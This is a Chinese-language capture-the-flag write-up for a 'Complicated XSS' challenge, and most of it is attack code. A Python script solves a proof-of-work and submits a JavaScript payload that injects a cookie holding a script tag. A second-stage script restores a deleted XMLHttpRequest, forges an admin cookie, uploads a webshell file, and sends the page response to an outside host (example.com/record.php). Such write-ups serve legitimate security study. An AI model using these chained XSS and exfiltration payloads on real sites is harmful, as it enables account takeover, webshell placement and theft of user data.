## Complicated XSS

输入`admin.government.vip:8000`会跳转到`admin.government.vip:8000/login`进行登录，
登录后在`admin.government.vip:8000/`处，发现Cookie中的username字段会直接打到HTML页面上，这里可以进行二次XSS。
所以在原始payload中，要设置cookie如`username=<script src='http://example.com/xss.js'></script>;domain=.government.vip;path=/`来进行2次XSS，在`admin.government.vip:8000`下XSS就没有域限制。


原始payload脚本（第一次XSS）如下：
```py
def solve(cap):
    print 'cap: %s' % cap
    for i in xrange(1000000000):
        if hashlib.md5(str(i)).hexdigest()[:len(cap)] == cap:
            return str(i)

s = requests.session()
resp = s.get('http://government.vip/').text
resp = resp[resp.index(" === '")+len(" === '"):]
resp = resp[:6]
task = solve(resp)
data =  {"task": task, 'payload': '''
<script>
function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 *1000));
        var expires = "; expires=" + date.toGMTString();
    }
    else {
        var expires = "";
    }
    document.cookie = name + "=" + value + expires + ";domain=.government.vip;path=/";
}
function eraseCookie(name) {
    createCookie(name,"",-1);
}
eraseCookie("username");
// remember to ENCODE and REPLACE "BASE64_ENCODE_HERE(.)" in the payload below, or the end of script tag in the payload string makes trouble
document.cookie=atob(BASE64_ENCODE_HERE('''username=<script src='http://example.com/xss.js'></script>;domain=.government.vip;path=/'''));
document.write('<iframe src="http://admin.government.vip:8000/" id="i"></iframe>');
</script>
''', 'submit':'submit'}
print s.post('http://government.vip/run.php', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'}).text
```


`http://example.com/xss.js`要做的事情如下：
1. 恢复cookie中的username为admin
2. 因为`admin.government.vip:8000/`中`delete XMLHttpRequest`，我们可以从`<iframe src='/login' id='iij'></iframe>`中的contentWindow中把XMLHttpRequest恢复出来。
3. 使用恢复后的XMLHttpRequest，用恢复后的Cookie: username=admin把`<iframe src='/' id='ii'></iframe>`的页面内容回传。


回传后，发现admin的`admin.government.vip:8000/`页面不是flag而是一个让你上传webshell的表单，那么接下来我们只需要把第三步改成：
3. 使用恢复后的XMLHttpRequest，用恢复后的Cookie: username=admin，往`/upload`POST一个webshell文件（其实什么内容都可以），把response回传。


`http://example.com/xss.js`如下：
```javascript
//'username=admin;domain=.government.vip;path=/'
document.cookie=atob('dXNlcm5hbWU9YWRtaW47ZG9tYWluPS5nb3Zlcm5tZW50LnZpcDtwYXRoPS8=');
document.write("<iframe src='/login' id='iij'></iframe><iframe src='/' id='ii'></iframe>");

function send2(x, p) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
    };
    xhr.open('POST', 'http://example.com/record.php?'+p+'='+btoa(x), true);
    xhr.send(null);
}

setTimeout(function(){
    var arr = ["Function","eval","alert","XMLHttpRequest","Proxy","Image","postMessage"];
    for(var i in arr) {
        i = arr[i];
        window[i] = document.getElementById('iij').contentWindow[i];
    }

    function send(url, data) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState == 4)
                send2(xhr.responseText, 'resp');
        };
        var d = new FormData();
        d.append('file', new Blob([data]), 'agrnhte.php');
        xhr.send(d);
    }
    
    send("http://admin.government.vip:8000/upload", 'aaa');
}, 1000);

```


其实过程中遇到了玄学问题，比如它回传个400 BAD REQUEST什么就不谈了...
